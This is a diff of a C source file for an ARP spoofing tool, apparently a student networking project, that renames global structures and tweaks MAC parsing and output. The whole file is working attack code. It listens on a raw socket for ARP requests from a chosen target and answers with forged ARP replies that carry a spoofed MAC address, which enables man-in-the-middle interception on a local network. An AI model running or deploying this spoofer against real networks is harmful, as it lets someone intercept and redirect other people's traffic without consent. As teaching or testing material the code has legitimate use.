@@ -22,19 +22,8 @@
 
 #include "libft.h"
 
-struct var
-{
-	int sfd;
-	int loop;
 
-	// program options
-	struct host host;
-	struct host requested_host;
-	struct ether_addr mac_address;
-	bool verbose;
-};
-
-struct host
+struct s_host
 {
 	char *h_name;
 	struct in_addr ip_addr;
@@ -42,12 +31,35 @@ struct host
 	struct ether_addr mac_addr;
 };
 
-struct var g_var = {
+struct s_env
+{
+	int sfd;
+	int loop;
+
+	// program options
+	struct s_host host;
+	struct s_host requested_host;
+	struct ether_addr mac_address;
+
+	bool verbose;
+};
+
+struct s_env g_env = {
 	.sfd = 0,
 	.loop = true,
-	.host = {0},
-	.requested_host = {0},
-	.mac_address = {0},
+	.host = {
+		.h_name = NULL,
+		.ip_addr = {0},
+		.ip_list = NULL,
+		.mac_addr = {{0}},
+	},
+	.requested_host = {
+		.h_name = NULL,
+		.ip_addr = {0},
+		.ip_list = NULL,
+		.mac_addr = {{0}},
+	},
+	.mac_address = {{0}},
 	.verbose = false
 };
 
@@ -56,14 +68,14 @@ void handle_sigint(int sig)
 	if (sig == SIGINT)
 	{
 		// can be called asynchronously
-		g_var.loop = false; // set flag
-		close(g_var.sfd);
+		g_env.loop = false; // set flag
+		close(g_env.sfd);
 	}
 }
 
 void print_ethernet_header(struct ether_header *eth_hdr)
 {
-	if (g_var.verbose)
+	if (g_env.verbose)
 	{
 		printf("     Source MAC: %s\n", ether_ntoa((struct ether_addr *)eth_hdr->ether_shost));
 		printf("     Target MAC: %s\n", ether_ntoa((struct ether_addr *)eth_hdr->ether_dhost));
@@ -72,7 +84,7 @@ void print_ethernet_header(struct ether_header *eth_hdr)
 
 void print_arp_header(struct ether_arp *arp_hdr, int recv_len)
 {
-	if (g_var.verbose)
+	if (g_env.verbose)
 	{
 		char sender_ip_str[INET_ADDRSTRLEN];
 		char target_ip_str[INET_ADDRSTRLEN];
@@ -103,13 +115,10 @@ void print_arp_header(struct ether_arp *arp_hdr, int recv_len)
 }
 
 // function to convert a string to a mac address as ether_addr
-int ft_ether_aton(const char *asc, struct ether_addr *haddr)
+int ft_ether_aton(const char *str, struct ether_addr *haddr)
 {
-	// Check the length of the input string
-	if (ft_strlen(asc) != 17)
-	{
+	if (ft_strlen(str) != 17)
 		return 0; // Invalid MAC address length
-	}
 
 	char nb[3];
 	nb[2] = '\0';
@@ -117,12 +126,10 @@ int ft_ether_aton(const char *asc, struct ether_addr *haddr)
 	// Check if each byte of the MAC address is within a valid range
 	for (int i = 0; i < 6; ++i)
 	{
-		nb[0] = asc[i * 3];
-		nb[1] = asc[i * 3 + 1];
-		if (ft_isalnum(nb[0]) == 0 || ft_isalnum(nb[1]) == 0)
-		{
-			return 0; // Invalid MAC address
-		}
+		nb[0] = str[i * 3];
+		nb[1] = str[i * 3 + 1];
+		if (ft_strtol(nb, NULL, 16) == 0 && nb[0] != '0')
+			return 0; // Invalid hex number
 		haddr->ether_addr_octet[i] = ft_strtol(nb, NULL, 16);
 	}
 
@@ -136,7 +143,7 @@ void send_arp_reply(uint8_t *host_ip, uint8_t *host_mac, uint8_t *requested_ip, 
 
 	// fill ethernet header
 	eth_hdr.ether_type = htons(ETHERTYPE_ARP);
-	ft_memcpy(eth_hdr.ether_shost, g_var.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
+	ft_memcpy(eth_hdr.ether_shost, g_env.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
 	ft_memcpy(eth_hdr.ether_dhost, host_mac, ETHER_ADDR_LEN);
 
 	// fill arp header
@@ -145,7 +152,7 @@ void send_arp_reply(uint8_t *host_ip, uint8_t *host_mac, uint8_t *requested_ip, 
 	arp_hdr.arp_hln = ETHER_ADDR_LEN;
 	arp_hdr.arp_pln = sizeof(in_addr_t);
 	arp_hdr.arp_op = htons(ARPOP_REPLY);
-	ft_memcpy(arp_hdr.arp_sha, g_var.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
+	ft_memcpy(arp_hdr.arp_sha, g_env.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
 	ft_memcpy(arp_hdr.arp_spa, requested_ip, sizeof(in_addr_t));
 	ft_memcpy(arp_hdr.arp_tha, host_mac, ETHER_ADDR_LEN);
 	ft_memcpy(arp_hdr.arp_tpa, host_ip, sizeof(in_addr_t));
@@ -160,12 +167,12 @@ void send_arp_reply(uint8_t *host_ip, uint8_t *host_mac, uint8_t *requested_ip, 
 	print_arp_header(&arp_hdr, sizeof(buf));
 
 	// send packet to requester
-	if (sendto(g_var.sfd, buf, sizeof(buf), 0, (struct sockaddr *)recv_addr, sizeof(struct sockaddr_ll)) == -1)
+	if (sendto(g_env.sfd, buf, sizeof(buf), 0, (struct sockaddr *)recv_addr, sizeof(struct sockaddr_ll)) == -1)
 	{
 		strerror(errno);
 		return;
 	}
-	printf("     Sent reply!\n");
+	printf("\033[0;31m     Sent reply!\n\033[0m");
 }
 
 int handle_arp_packets()
@@ -185,17 +192,17 @@ int handle_arp_packets()
 		return 1;
 	}
 
-	while (g_var.loop)
+	while (g_env.loop)
 	{
 		memset(&recv_addr, 0, sizeof(recv_addr));
-		printf("\n   Waiting for arp request...\n");
-		recv_len = recvfrom(g_var.sfd, recv_buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&recv_addr, &recv_addr_len);
-		if (recv_len == -1 && g_var.loop)
+		printf("\n   Waiting for arp request from target (%s)...\n", inet_ntoa(g_env.host.ip_addr));
+		recv_len = recvfrom(g_env.sfd, recv_buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&recv_addr, &recv_addr_len);
+		if (recv_len == -1 && g_env.loop)
 		{
 			printf("   Error receiving packet: %s\n", strerror(errno));
 			return 1;
 		}
-		else if (g_var.loop == false)
+		else if (g_env.loop == false)
 		{
 			printf("Received SIGINT, exiting...\n");
 			break;
@@ -207,17 +214,17 @@ int handle_arp_packets()
 		// check if the packet is an arp request
 		if (ntohs(arp_hdr->arp_op) == ARPOP_REQUEST)
 		{
-			if (g_var.verbose) {
+			if (g_env.verbose) {
 				printf("    Received request!\n");
 				print_ethernet_header(eth_hdr);
 				print_arp_header(arp_hdr, recv_len);
 			}
 
-			if ((ft_memcmp(&arp_hdr->arp_spa, &g_var.host.ip_addr.s_addr, sizeof(in_addr_t)) == 0) ||
-				(ft_memcmp(&arp_hdr->arp_sha, &g_var.host.mac_addr.ether_addr_octet, ETHER_ADDR_LEN) == 0))
+			if ((ft_memcmp(&arp_hdr->arp_spa, &g_env.host.ip_addr.s_addr, sizeof(in_addr_t)) == 0) ||
+				(ft_memcmp(&arp_hdr->arp_sha, &g_env.host.mac_addr.ether_addr_octet, ETHER_ADDR_LEN) == 0))
 			{
 				// if request host ip is not null, then the option -r was used and we need to check if the requested host ip is the same as the one in the packet before sending the reply
-				if (g_var.requested_host.ip_addr.s_addr != 0 && ft_memcmp(&arp_hdr->arp_tpa, &g_var.requested_host.ip_addr.s_addr, sizeof(in_addr_t)) != 0)
+				if (g_env.requested_host.ip_addr.s_addr != 0 && ft_memcmp(&arp_hdr->arp_tpa, &g_env.requested_host.ip_addr.s_addr, sizeof(in_addr_t)) != 0)
 					continue;
 
 				printf("    ARP request matches provided data.\n");
@@ -253,29 +260,29 @@ struct ifaddrs *find_interface(struct ifaddrs *ifaddr)
 			// check if the broadcast address is from the same network using the ifa_netmask
 			struct sockaddr_in *mask = (struct sockaddr_in *)ifa->ifa_netmask;
 
-			if ((g_var.host.ip_addr.s_addr & mask->sin_addr.s_addr) == (broad_addr->sin_addr.s_addr & mask->sin_addr.s_addr))
+			if ((g_env.host.ip_addr.s_addr & mask->sin_addr.s_addr) == (broad_addr->sin_addr.s_addr & mask->sin_addr.s_addr))
 			{
 				printf("Found interface %s\n", ifa->ifa_name);
 				return ifa;
 			}
 			// if g_var.host.ip_addr is not set, check all the ips from g_var.host.ip_list
-			else if (g_var.host.ip_addr.s_addr == 0)
+			else if (g_env.host.ip_addr.s_addr == 0)
 			{
-				for (int i = 0; g_var.host.ip_list[i] != NULL; i++)
+				for (int i = 0; g_env.host.ip_list[i] != NULL; i++)
 				{
-					in_addr_t ip = *(in_addr_t *)g_var.host.ip_list[i];
-					if (g_var.verbose)
+					in_addr_t ip = *(in_addr_t *)g_env.host.ip_list[i];
+					if (g_env.verbose)
 						printf("Checking if %s is in the same network as %s\n", inet_ntoa(*(struct in_addr *)&ip), broad_addr_str);
 					// print results of bits operations
 					if ((ip & mask->sin_addr.s_addr) == (broad_addr->sin_addr.s_addr & mask->sin_addr.s_addr))
 					{
 						printf("Found interface %s\n", ifa->ifa_name);
-						g_var.host.ip_addr.s_addr = ip;
+						g_env.host.ip_addr.s_addr = ip;
 						return ifa;
 					}
 					else
 					{
-						if (g_var.verbose)
+						if (g_env.verbose)
 							printf("%s is not in the same network as %s\n", inet_ntoa(*(struct in_addr *)&ip), broad_addr_str);
 					}
 				}
@@ -289,7 +296,7 @@ struct ifaddrs *find_interface(struct ifaddrs *ifaddr)
 	return NULL;
 }
 
-int get_mac_address(char *iface, unsigned char *mac)
+int get_mac_address(char *iface, uint8_t *mac)
 {
 	char path[128];
 	int fd;
@@ -302,7 +309,7 @@ int get_mac_address(char *iface, unsigned char *mac)
 		return 1;
 	}
 
-	char mac_str[18];
+	char mac_str[18] = {0};
 	ssize_t n = read(fd, mac_str, sizeof(mac_str) - 1);
 	if (n == -1)
 	{
@@ -310,7 +317,6 @@ int get_mac_address(char *iface, unsigned char *mac)
 		close(fd);
 		return 1;
 	}
-	mac_str[n] = '\0';
 
 	if (ft_ether_aton(mac_str, (struct ether_addr *)mac) == 0)
 	{
@@ -326,8 +332,8 @@ int get_mac_address(char *iface, unsigned char *mac)
 int create_socket()
 {
 	// create socket
-	g_var.sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	if (g_var.sfd == -1)
+	g_env.sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	if (g_env.sfd == -1)
 	{
 		strerror(errno);
 		return 1;
@@ -340,21 +346,21 @@ int create_socket()
 		strerror(errno);
 		return 1;
 	}
+
 	if ((interface = find_interface(ifaddr)) == NULL)
-	{
 		return 1;
-	}
-	// if g_var.mac_address is not set, use the interface mac address
-	if (g_var.mac_address.ether_addr_octet[0] == 0 && g_var.mac_address.ether_addr_octet[1] == 0 && g_var.mac_address.ether_addr_octet[2] == 0 && g_var.mac_address.ether_addr_octet[3] == 0 && g_var.mac_address.ether_addr_octet[4] == 0 && g_var.mac_address.ether_addr_octet[5] == 0)
+
+	// if g_env.mac_address is not set, use the interface mac address
+	if (g_env.mac_address.ether_addr_octet[0] == 0 && g_env.mac_address.ether_addr_octet[1] == 0 && g_env.mac_address.ether_addr_octet[2] == 0 && g_env.mac_address.ether_addr_octet[3] == 0 && g_env.mac_address.ether_addr_octet[4] == 0 && g_env.mac_address.ether_addr_octet[5] == 0)
 	{
-		if (get_mac_address(interface->ifa_name, g_var.mac_address.ether_addr_octet) == 1)
+		if (get_mac_address(interface->ifa_name, g_env.mac_address.ether_addr_octet) == 1)
 		{
 			return 1;
 		}
 	}
 
 	// set interface to socket
-	if (setsockopt(g_var.sfd, SOL_SOCKET, SO_BINDTODEVICE, interface->ifa_name, ft_strlen(interface->ifa_name)) == -1)
+	if (setsockopt(g_env.sfd, SOL_SOCKET, SO_BINDTODEVICE, interface->ifa_name, ft_strlen(interface->ifa_name)) == -1)
 	{
 		strerror(errno);
 		return 1;
@@ -365,7 +371,7 @@ int create_socket()
 	return handle_arp_packets();
 }
 
-int get_host(struct host *host, char *host_arg)
+int get_host(struct s_host *host, char *host_arg)
 {
 	struct hostent *hostent = NULL;
 
@@ -418,7 +424,7 @@ int get_args(int argc, char **argv)
 			}
 		}
 		else if (ft_strcmp(argv[i], "-v") == 0)
-			g_var.verbose = 1;
+			g_env.verbose = 1;
 		else
 		{
 			printf("Unknown option: %s\n", argv[i]);
@@ -426,7 +432,7 @@ int get_args(int argc, char **argv)
 		}
 	}
 
-	if (get_host(&g_var.host, host_arg) == -1)
+	if (get_host(&g_env.host, host_arg) == -1)
 	{
 		printf("Invalid host: %s\n", host_arg);
 		return 1;
@@ -434,7 +440,7 @@ int get_args(int argc, char **argv)
 
 	if (requested_host_arg != NULL)
 	{
-		int ret = get_host(&g_var.requested_host, requested_host_arg);
+		int ret = get_host(&g_env.requested_host, requested_host_arg);
 		if (ret == -1 || ret == 2)
 		{
 			printf("-r : Invalid requested host: %s\n", requested_host_arg);
@@ -444,7 +450,7 @@ int get_args(int argc, char **argv)
 
 	if (mac_address_arg != NULL)
 	{
-		if (ft_ether_aton(mac_address_arg, &g_var.mac_address) == 0)
+		if (ft_ether_aton(mac_address_arg, &g_env.mac_address) == 0)
 		{
 			printf("-m : Invalid MAC address\n");
 			return 1;
@@ -456,7 +462,7 @@ int get_args(int argc, char **argv)
 		printf("Requested host: %s\n", requested_host_arg);
 	if (mac_address_arg != NULL)
 		printf("MAC Address sent: %s\n", mac_address_arg);
-	if (g_var.verbose)
+	if (g_env.verbose)
 		printf("Verbose Mode: Enabled\n");
 	else
 		printf("Verbose Mode: Disabled\n");
@@ -469,16 +475,13 @@ int main(int argc, char **argv)
 	if (argc < 2 || argc > 7)
 	{
 		printf("Usage: %s host [-r requested_host] [-m mac_address] [-v]\n", argv[0]);
-		printf("  host: The hostname, IP address, or MAC address of the target machine.\n");
-		printf("  -r requested_host: The hostname or IP address of the requested machine.\n");
-		printf("  -m mac_address: The MAC address to use for the arp reply. (by default, the current machine address is used)\n");
+		printf("  host: The hostname, IP address, or MAC address of the targeted machine.\n\n");
+		printf("Options:\n");
+		printf("  -r requested_host: The hostname or IP address of the target's requested machine.\n");
+		printf("  -m mac_address: The MAC address used for spoofing, sent in the ARP reply. (by default, the current machine address is used)\n");
 		printf("  -v: Enable verbose mode.\n");
 		return 1;
 	}
-
-	// ft_bzero(&g_var.host, sizeof(struct host));
-	// ft_bzero(&g_var.requested_host, sizeof(struct host));
-	// ft_bzero(&g_var.mac_address, sizeof(struct ether_addr));
 
 	if (get_args(argc, argv) == 1)
 		return 1;
